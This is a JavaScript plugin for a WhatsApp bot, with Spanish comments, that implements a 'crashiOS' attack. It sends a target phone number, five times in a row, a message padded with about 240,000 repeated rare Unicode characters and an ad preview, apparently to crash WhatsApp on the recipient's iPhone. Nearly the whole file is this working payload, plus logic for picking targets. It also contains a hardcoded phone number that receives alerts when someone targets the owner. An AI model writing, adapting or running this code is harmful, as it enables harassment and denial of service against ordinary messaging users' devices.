// plugins/home-ios.js

// Importamos 'fs' porque la función crashiOS lo necesita para leer la imagen
const fs = require('fs');

module.exports = {
    name: 'home-ios',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones que necesitamos del 'context'
        const { isBot, isCreator, q, reply, candList, sleep } = context;

        // 2. Definimos la función 'crashiOS' aquí adentro.
        //    Ahora es parte del plugin y tiene acceso a 'm' y 'conn'.
        async function crashiOS(target) {
            await conn.sendMessage(target, {
                text: "> chocoplus" + "𑇂𑆵𑆴𑆿".repeat(60000),
                contextInfo: {
                    externalAdReply: {
                        title: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>`,
                        body: `BOOT FREE`,
                        previewType: "PHOTO",
                        thumbnail: fs.readFileSync("./media/ola.jpg"),
                        sourceUrl: ``
                    }
                }
            }, { quoted: m });
        }

        // 3. Tu código original, sin modificar su lógica
        if (!isBot && !isCreator) return;

        let pelaku = m.mentionedJid && m.mentionedJid.length > 0
            ? m.mentionedJid[0]
            : m.quoted
                ? m.quoted.sender
                : (q ? q.replace(/[^0-9]/g, '') : null);

        if (!pelaku) return reply(" Ingresa un número válido.");

        let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
        
        // Usamos la variable 'candList' que recibimos del context
        if (candList.includes(target)) {
            await conn.sendMessage(m.chat, { 
                text: `Nel, con el owner no ` 
            }, { quoted: m });
            await conn.sendMessage("593969533280@s.whatsapp.net", { 
                text: `User *${m.sender}* intentó follar a ${target}.`
            });
            return;
        }

        crashiOS(target);
        await sleep(3000);
        crashiOS(target);
        await sleep(3000);
        crashiOS(target);
        await sleep(3000);
        crashiOS(target);
        await sleep(3000);
        crashiOS(target);
        
        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
    }
};